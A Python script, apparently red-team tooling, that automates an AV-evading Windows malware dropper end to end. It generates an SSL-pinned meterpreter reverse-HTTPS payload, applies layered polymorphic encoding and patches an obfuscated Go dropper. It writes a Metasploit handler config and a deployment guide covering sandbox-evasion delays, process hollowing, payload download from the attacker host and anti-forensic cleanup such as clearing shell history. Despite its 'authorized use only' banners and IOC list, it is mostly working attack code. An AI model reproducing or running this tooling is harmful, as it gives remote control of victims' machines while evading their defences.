#!/usr/bin/env python3
"""
Automated Dropper Deployment System
Generates everything needed for a complete engagement in one command.

Usage:
    python3 automate_deployment.py --lhost 192.168.88.166 --lport 443

FOR AUTHORIZED RED TEAM EXERCISES ONLY
"""

import os
import sys
import subprocess
import argparse
import hashlib
import re
from pathlib import Path

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_header(msg):
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{msg:^70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")

def print_success(msg):
    print(f"{Colors.OKGREEN}[✓]{Colors.ENDC} {msg}")

def print_info(msg):
    print(f"{Colors.OKCYAN}[*]{Colors.ENDC} {msg}")

def print_warning(msg):
    print(f"{Colors.WARNING}[!]{Colors.ENDC} {msg}")

def print_error(msg):
    print(f"{Colors.FAIL}[✗]{Colors.ENDC} {msg}")

def run_command(cmd, description, capture=False):
    """Run shell command with error handling"""
    print_info(f"{description}...")
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            return result.stdout.strip()
        else:
            subprocess.run(cmd, shell=True, check=True)
            print_success(f"{description} complete")
            return None
    except subprocess.CalledProcessError as e:
        print_error(f"{description} failed: {e}")
        sys.exit(1)

def generate_ssl_certificate(lhost):
    """Generate SSL certificate and return hash"""
    print_header("Phase 1: SSL Certificate Generation")

    # Generate certificate in current directory
    cmd = f"""openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
        -subj "/C=US/ST=Texas/L=Austin/O=TechCorp/CN={lhost}" \
        -keyout meterpreter.key -out meterpreter.crt 2>/dev/null"""
    run_command(cmd, "Generating RSA 4096-bit certificate")

    # Combine into PEM
    run_command("cat meterpreter.key meterpreter.crt > meterpreter.pem",
                "Creating PEM file")

    # Get certificate hash
    cert_hash = run_command(
        "openssl x509 -in meterpreter.crt -outform DER | sha256sum | cut -d ' ' -f1",
        "Extracting certificate hash",
        capture=True
    )

    print_success(f"Certificate hash: {cert_hash}")
    return cert_hash

def generate_payload(lhost, lport, cert_hash):
    """Generate meterpreter payload"""
    print_header("Phase 2: Meterpreter Payload Generation")

    cmd = f"""msfvenom -p windows/x64/meterpreter/reverse_https \
        LHOST={lhost} LPORT={lport} EXITFUNC=thread \
        HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        StagerVerifySSLCert=true StagerSSLCertHash={cert_hash} \
        -f raw -o payload_staged_ssl.raw 2>/dev/null"""

    run_command(cmd, "Generating staged meterpreter with SSL pinning")

    # Get payload size
    size = os.path.getsize("payload_staged_ssl.raw")
    print_success(f"Payload generated: {size} bytes")
    return size

def encode_payload():
    """Encode payload and extract parameters"""
    print_header("Phase 3: Polymorphic Encoding")

    # Run encoder
    result = run_command(
        "python3 encode_shellcode_v2.py payload_staged_ssl.raw payload_staged_ssl.enc",
        "Encoding with 10-layer polymorphic encoding",
        capture=True
    )

    # Parse output to extract parameters
    params = {}

    # Extract const parameters
    for line in result.split('\n'):
        if 'DECODER_SEED' in line:
            params['seed'] = int(re.search(r'= (\d+)', line).group(1))
        elif 'XOR_KEY1' in line:
            params['xor1'] = re.search(r'= (0x[0-9a-f]+)', line).group(1)
        elif 'ROL_BITS' in line:
            params['rol'] = int(re.search(r'= (\d+)', line).group(1))
        elif 'ADD_KEY' in line:
            params['add'] = re.search(r'= (0x[0-9a-f]+)', line).group(1)
        elif 'XOR_KEY2' in line:
            params['xor2'] = re.search(r'= (0x[0-9a-f]+)', line).group(1)
        elif 'REVBLOCK_SIZE' in line:
            params['block'] = int(re.search(r'= (\d+)', line).group(1))
        elif 'XOR_KEY3' in line:
            params['xor3'] = re.search(r'= (0x[0-9a-f]+)', line).group(1)
        elif 'ORIGINAL_LENGTH' in line:
            params['orig_len'] = int(re.search(r'= (\d+)', line).group(1))
        elif 'ENCODED_LENGTH' in line:
            params['enc_len'] = int(re.search(r'= (\d+)', line).group(1))
        elif 'CHACHA_KEY' in line:
            params['chacha_key'] = re.search(r'"([0-9a-f]+)"', line).group(1)
        elif 'CHACHA_NONCE' in line:
            params['chacha_nonce'] = re.search(r'"([0-9a-f]+)"', line).group(1)
        elif 'AES_KEY' in line:
            params['aes_key'] = re.search(r'"([0-9a-f]+)"', line).group(1)

    print_success(f"Encoded payload: {params['enc_len']} bytes")
    return params

def update_dropper(params, lhost):
    """Update dropper.go with new parameters"""
    print_header("Phase 4: Updating Dropper Source Code")

    # Read dropper template
    with open('dropper.go', 'r') as f:
        dropper_code = f.read()

    # Update const line (line 18)
    old_const = re.search(r'const\(f=\d+;g=0x[0-9a-f]+;h=\d+;j=0x[0-9a-f]+;k=0x[0-9a-f]+;l=\d+;m=0x[0-9a-f]+;n=\d+;o=\d+\)', dropper_code)
    new_const = f"const(f={params['seed']};g={params['xor1']};h={params['rol']};j={params['add']};k={params['xor2']};l={params['block']};m={params['xor3']};n={params['orig_len']};o={params['enc_len']})"
    dropper_code = dropper_code.replace(old_const.group(0), new_const)
    print_success("Updated encoding parameters (line 18)")

    # Update AES key (around line 56)
    old_aes = re.search(r'AN\(BZ,"[0-9a-f]+"\)', dropper_code)
    new_aes = f'AN(BZ,"{params["aes_key"]}")'
    dropper_code = dropper_code.replace(old_aes.group(0), new_aes)
    print_success("Updated AES-256-GCM key")

    # Update ChaCha20 keys (around lines 54-55 in main function)
    old_chacha = re.search(r'p="[0-9a-f]+"', dropper_code)
    old_nonce = re.search(r'q="[0-9a-f]+"', dropper_code)

    if old_chacha and old_nonce:
        new_chacha = f'p="{params["chacha_key"]}"'
        new_nonce = f'q="{params["chacha_nonce"]}"'
        dropper_code = dropper_code.replace(old_chacha.group(0), new_chacha)
        dropper_code = dropper_code.replace(old_nonce.group(0), new_nonce)
        print_success("Updated ChaCha20 key and nonce")
    else:
        print_warning("Could not find ChaCha20 keys pattern - manual update needed")

    # Update LHOST if needed (around line 50 in main)
    # Match EITHER format:
    # Format 1: AI("http"+"://"+"192"+"."+"168"+"."+"88"+"."+"166"+":8000"...)
    # Format 2: AI("http"+"://"+"192"+".168"+".88"+".166"+":8000"...)
    old_url = re.search(r'AI\("http"\+"://"\+[^)]+\+":8000"\+"/pay"\+"load"\+"_sta"\+"ged"\+"_ssl"\+"\.enc"\)', dropper_code)
    if old_url:
        # Split IP into obfuscated parts - use the SAME format as template (with literal dots)
        # This matches: "192"+".168"+".88"+".166"
        ip_parts = lhost.split('.')
        # Build: "192"+".168"+".88"+".166"
        ip_str = f'"{ip_parts[0]}"+".{ip_parts[1]}"+".{ip_parts[2]}"+".{ip_parts[3]}"'
        # Complete URL
        new_url = f'AI("http"+"://"+{ip_str}+":8000"+"/pay"+"load"+"_sta"+"ged"+"_ssl"+".enc")'
        dropper_code = dropper_code.replace(old_url.group(0), new_url)
        print_success(f"Updated download URL to {lhost}")
    else:
        print_warning("Could not find URL pattern - manual update needed")

    # Write updated dropper
    with open('dropper_custom.go', 'w') as f:
        f.write(dropper_code)

    print_success("Created dropper_custom.go with updated parameters")

def compile_dropper():
    """Compile Go dropper"""
    print_header("Phase 5: Compiling Dropper")

    # Initialize Go module if not already done
    if not os.path.exists('go.mod'):
        print_info("Initializing Go module")
        run_command('go mod init dropper', "Creating go.mod")
        run_command('go mod tidy', "Downloading dependencies")
    else:
        print_info("Go module already initialized")
        run_command('go mod download', "Ensuring dependencies are downloaded")

    # Check if on Windows (for cross-compilation)
    if os.name == 'nt':
        print_info("Detected Windows - compiling natively")
        run_command('go build -ldflags="-s -w" -o dropper_custom.exe dropper_custom.go',
                   "Compiling with stripped symbols")
    else:
        print_info("Detected Linux - cross-compiling for Windows")
        run_command('GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dropper_custom.exe dropper_custom.go',
                   "Cross-compiling for Windows x64")

    size = os.path.getsize('dropper_custom.exe') / (1024 * 1024)
    print_success(f"Compiled dropper_custom.exe ({size:.2f} MB)")

def create_handler_config(lhost, lport):
    """Create Metasploit handler resource script"""
    print_header("Phase 6: Creating Handler Configuration")

    handler_content = f"""# Auto-generated Metasploit Handler
# Generated for engagement: {lhost}:{lport}

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST {lhost}
set LPORT {lport}
set EXITFUNC thread

# SSL Certificate Configuration
set HandlerSSLCert meterpreter.pem
set StagerVerifySSLCert true

# Performance Options
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru

# Session Configuration
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 604800

# Auto-migration
set AutoRunScript post/windows/manage/migrate

# Start handler
exploit -j -z
"""

    with open('handler_custom.rc', 'w') as f:
        f.write(handler_content)

    print_success("Created handler_custom.rc")

def create_deployment_summary(lhost, lport, cert_hash, params):
    """Create deployment summary document"""
    print_header("Phase 7: Creating Deployment Summary")

    summary = f"""# Deployment Summary
Generated: {subprocess.run('date', shell=True, capture_output=True, text=True).stdout.strip()}

## Engagement Details
- **LHOST:** {lhost}
- **LPORT:** {lport}
- **Target:** Windows x64
- **Payload:** Staged meterpreter HTTPS with SSL pinning

## SSL Certificate
- **Location:** /tmp/meterpreter.pem
- **Hash:** {cert_hash}
- **Valid:** 365 days

## Encoding Parameters
- **Seed:** {params['seed']}
- **XOR Keys:** {params['xor1']}, {params['xor2']}, {params['xor3']}
- **ROL Bits:** {params['rol']}
- **ADD Key:** {params['add']}
- **Block Size:** {params['block']}
- **Original Size:** {params['orig_len']} bytes
- **Encoded Size:** {params['enc_len']} bytes

## Cryptographic Keys
- **AES-256-GCM:** {params['aes_key']}
- **ChaCha20 Key:** {params['chacha_key']}
- **ChaCha20 Nonce:** {params['chacha_nonce']}

## Files Generated
- `payload_staged_ssl.raw` - Raw meterpreter stager ({params['orig_len']} bytes)
- `payload_staged_ssl.enc` - Encoded payload ({params['enc_len']} bytes)
- `dropper_custom.go` - Updated dropper source
- `dropper_custom.exe` - Compiled dropper
- `handler_custom.rc` - Metasploit handler config

## Deployment Commands

### Start HTTP Server
```bash
python3 -m http.server 8000
# Place payload_staged_ssl.enc in current directory
```

### Start Metasploit Handler
```bash
msfconsole -q -r handler_custom.rc
```

### Execute on Target (Windows)
```powershell
.\\dropper_custom.exe
```

## Execution Timeline
1. Initial delay: 15 seconds (sandbox evasion)
2. Download payload via HTTP
3. Decrypt and decode: ~2 seconds
4. Second delay: 10 seconds (behavioral evasion)
5. Process hollowing: ~1 second
6. SSL verification + stage download: ~2 seconds
7. Auto-migration: ~1 second
8. **Total: ~31 seconds to established shell**

## Cleanup Checklist
- [ ] Stop HTTP server
- [ ] Stop Metasploit handler
- [ ] Delete SSL certificate: `rm /tmp/meterpreter.*`
- [ ] Delete payload files: `rm payload_staged_ssl.*`
- [ ] Delete dropper: `rm dropper_custom.*`
- [ ] Clear bash history: `history -c`

## IOCs for Blue Team
- Notepad.exe with network activity
- Outbound HTTPS to {lhost}:{lport}
- Process with RWX memory (PAGE_EXECUTE_READWRITE)
- CreateProcessA with CREATE_SUSPENDED flag
- SSL certificate hash: {cert_hash}

---
**AUTHORIZED RED TEAM USE ONLY**
Document and destroy after engagement.
"""

    with open('DEPLOYMENT_SUMMARY.txt', 'w') as f:
        f.write(summary)

    print_success("Created DEPLOYMENT_SUMMARY.txt")

def main():
    parser = argparse.ArgumentParser(
        description='Automated Dropper Deployment System',
        epilog='FOR AUTHORIZED RED TEAM EXERCISES ONLY'
    )
    parser.add_argument('--lhost', required=True, help='Listener host (your IP)')
    parser.add_argument('--lport', type=int, default=443, help='Listener port (default: 443)')
    parser.add_argument('--skip-compile', action='store_true', help='Skip dropper compilation')
    parser.add_argument('--use-existing-payload', action='store_true', help='Use existing payload_staged_ssl.raw (skip msfvenom)')

    args = parser.parse_args()

    print_header("Automated Dropper Deployment System v2.0")
    print_info(f"Target: {args.lhost}:{args.lport}")
    print_warning("Ensure you have written authorization before deployment!")

    # Phase 1: SSL Certificate (skip if using existing payload)
    if args.use_existing_payload:
        print_header("Phase 1: SSL Certificate Generation")
        print_warning("Skipping - using existing payload (--use-existing-payload)")
        print_info("Make sure your handler uses the correct SSL certificate!")
        cert_hash = "EXISTING_PAYLOAD"
    else:
        cert_hash = generate_ssl_certificate(args.lhost)

    # Phase 2: Generate Payload (skip if using existing)
    if args.use_existing_payload:
        print_header("Phase 2: Meterpreter Payload Generation")
        print_warning("Skipping - using existing payload_staged_ssl.raw")
        if not os.path.exists('payload_staged_ssl.raw'):
            print_error("payload_staged_ssl.raw not found!")
            print_info("Place your payload file in the current directory")
            sys.exit(1)
        payload_size = os.path.getsize('payload_staged_ssl.raw')
        print_success(f"Found existing payload: {payload_size} bytes")
    else:
        payload_size = generate_payload(args.lhost, args.lport, cert_hash)

    # Phase 3: Encode Payload
    params = encode_payload()

    # Phase 4: Update Dropper
    update_dropper(params, args.lhost)

    # Phase 5: Compile Dropper
    if not args.skip_compile:
        compile_dropper()
    else:
        print_warning("Skipping compilation (--skip-compile flag)")

    # Phase 6: Handler Config
    create_handler_config(args.lhost, args.lport)

    # Phase 7: Deployment Summary
    create_deployment_summary(args.lhost, args.lport, cert_hash, params)

    # Final Summary
    print_header("Deployment Package Ready!")
    print_success("All files generated successfully\n")

    print(f"{Colors.BOLD}Next Steps:{Colors.ENDC}")
    print(f"{Colors.OKCYAN}1.{Colors.ENDC} Start HTTP server: {Colors.BOLD}python3 -m http.server 8000{Colors.ENDC}")
    print(f"{Colors.OKCYAN}2.{Colors.ENDC} Start handler: {Colors.BOLD}msfconsole -q -r handler_custom.rc{Colors.ENDC}")
    print(f"{Colors.OKCYAN}3.{Colors.ENDC} Deploy dropper: {Colors.BOLD}dropper_custom.exe{Colors.ENDC} on target")
    print(f"{Colors.OKCYAN}4.{Colors.ENDC} Wait ~31 seconds for meterpreter session")

    print(f"\n{Colors.WARNING}Generated Files:{Colors.ENDC}")
    print(f"  • /tmp/meterpreter.pem (SSL certificate)")
    print(f"  • payload_staged_ssl.enc (encoded payload)")
    print(f"  • dropper_custom.exe (compiled dropper)")
    print(f"  • handler_custom.rc (Metasploit config)")
    print(f"  • DEPLOYMENT_SUMMARY.txt (full documentation)")

    print(f"\n{Colors.FAIL}{Colors.BOLD}⚠️  REMEMBER: Delete all artifacts after engagement!{Colors.ENDC}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Cancelled by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
